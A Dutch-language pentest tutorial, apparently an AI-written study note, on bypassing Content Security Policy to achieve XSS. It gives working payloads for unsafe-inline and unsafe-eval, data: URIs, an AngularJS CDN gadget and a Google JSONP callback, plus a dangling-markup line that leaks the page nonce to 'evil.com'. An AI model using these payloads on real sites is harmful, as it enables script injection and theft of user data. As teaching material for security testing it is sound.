
Dit is de "Boss Fight" van XSS. Je hebt een injectiepunt gevonden, maar de browser weigert je script uit te voeren omdat er een **Content Security Policy (CSP)** header is.

Hier is de complete Obsidian notitie om CSP te analyseren en te breken.

---

Markdown

````
# 🚧 CSP Bypassing (Content Security Policy)

==Concept: Een HTTP-header die definieert welke bronnen (scripts, images) de browser mag laden.==
*Doel: XSS voorkomen. Jouw doel: Gaten vinden in deze policy.*



---

## 🧐 1. De Header Analyseren

Voordat je aanvalt, moet je weten wat de regels zijn. Zoek in de HTTP response headers (Burp/DevTools) naar:
`Content-Security-Policy: ...`

**Belangrijke Directives:**
* `default-src`: De fallback regel.
* `script-src`: **Hier zit de pijn.** Waar mogen scripts vandaan komen?
* `object-src`: Voor Flash/Java plugins (vaak zwak).
* `connect-src`: Waar mag data heen gestuurd worden (exfiltration).

> [!TIP] De Gouden Tool
> Probeer dit **nooit** met het blote oog te lezen. Kopieer de header en plak hem hier:
> 🔗 **[Google CSP Evaluator](https://csp-evaluator.withgoogle.com/)**
> *Deze tool vertelt je direct of er een "High Severity" bypass mogelijk is.*

---

## 🔓 2. Weak Policies (Directe Bypass)
*Als de beheerder lui was, staan deze instellingen aan.*

### Unsafe-Inline
Als dit in `script-src` staat, is de bescherming tegen XSS effectief **uitgeschakeld**.
* **Policy:** `script-src 'unsafe-inline' ...`
* **Payload:** `<script>alert(1)</script>` werkt gewoon.

### Unsafe-Eval
Staat `eval()` toe. Handig als je DOM XSS hebt gevonden.
* **Policy:** `script-src 'unsafe-eval' ...`
* **Payload:** `<img src=x onerror=eval('alert(1)')>`

### Wildcards (*)
* `script-src *`: Alles mag.
* `script-src https:`: Elk script via HTTPS mag (dus ook vanaf jouw `https://evil.com`).
* `script-src data:`: Je mag scripts in Base64 laden (`<script src=data:text/javascript;base64,...>`).

---

## 📚 3. CDN / Whitelist Bypasses (Gadgets)
*De policy zegt: "Je mag scripts laden van `https://cdnjs.cloudflare.com`".*
*De fout: Cloudflare host ook oude, kwetsbare bibliotheken.*

**De techniek:**
Jij injecteert een `<script>` tag die een oude versie van **AngularJS** of **Vue** laadt van de toegestane CDN. Vervolgens gebruik je een functie van die bibliotheek om code uit te voeren.

**Standaard AngularJS Payload (Werkt op bijna elke CDN whitelist):**
```html
<script src="[https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js](https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js)"></script>

<div ng-app ng-csp>
  {{$eval.constructor('alert(1)')()}}
</div>
````

_(Als de site `ajax.googleapis.com` toestaat, pas de URL dan aan)._

---

## 🔄 4. JSONP Endpoints Bypass

_Als de site API's vertrouwt (bijv. `*.google.com`), kun je soms JSONP callbacks misbruiken._

**Scenario:** Policy: `script-src 'self' https://www.google.com;`

**Aanval:** Google heeft endpoints die JS teruggeven. Als je dit in een script tag stopt, voert de browser het uit alsof het vertrouwd is.

HTML

```
<script src="[https://www.google.com/complete/search?client=chrome&q=hello&callback=alert](https://www.google.com/complete/search?client=chrome&q=hello&callback=alert)"></script>
```

_De browser haalt de URL op, Google antwoordt met `alert(...)` en omdat Google vertrouwd is, wordt de alert uitgevoerd._

---

## 📎 5. File Upload Bypass

_Als `script-src 'self'` aan staat._

Als je een bestand kunt uploaden (bijv. `avatar.jpg`) op dezelfde server:

1. Maak een bestand `exploit.js` met inhoud `alert(1)`.
    
2. Upload het (als de server `.js` toestaat) of vermom het.
    
3. Injecteer: `<script src="/uploads/exploit.js"></script>`. Omdat het van `'self'` komt (dezelfde domeinnaam), mag het.
    

---

## 🔑 6. Nonce Stealing (Dangling Markup)

_De policy gebruikt een random token (nonce): `script-src 'nonce-random123'`. Alleen scripts met dat token werken._

Als je een injectie hebt **boven** een legitiem script, kun je proberen de nonce te stelen door de HTML "open" te laten staan.

**Scenario:**

HTML

```
<script src="[http://evil.com?loot=](http://evil.com?loot=)

<script nonce="SECRET_TOKEN">...</script>
```

_De browser denkt dat alles tot de volgende quote onderdeel is van jouw URL, en stuurt zo de `nonce` naar jouw server._

---

## 🛠️ 7. Tools & Resources

**CSP Evaluator (Google)** De standaard voor analyse.

**CSP Bypass List (GitHub)** Een lijst met JSONP endpoints op grote sites (Google, Facebook, Yahoo) die je kunt misbruiken als ze op de whitelist staan.

- _Search:_ "HackTricks CSP Bypass"
    

**Burp Suite Extension: CSP Bypasser** Scant passief of de CSP zwak is en suggereert payloads.

---

## 📝 Checklist CSP Bypass

- [ ] **Evaluator:** Heb ik de header door de Google CSP Evaluator gehaald?
    
- [ ] **Directives:** Staan `unsafe-inline` of `unsafe-eval` aan?
    
- [ ] **CDNs:** Worden `cdnjs`, `jsdelivr` of `googleapis` vertrouwd? -> **Gebruik Angular Payload!**
    
- [ ] **JSONP:** Worden grote tech-domeinen vertrouwd? Zoek naar JSONP endpoints.
    
- [ ] **Uploads:** Kan ik een JS file uploaden op het 'self' domein?
    
- [ ] **Base64:** Staat `data:` in de script-src? -> `<script src="data:...,alert(1)">`.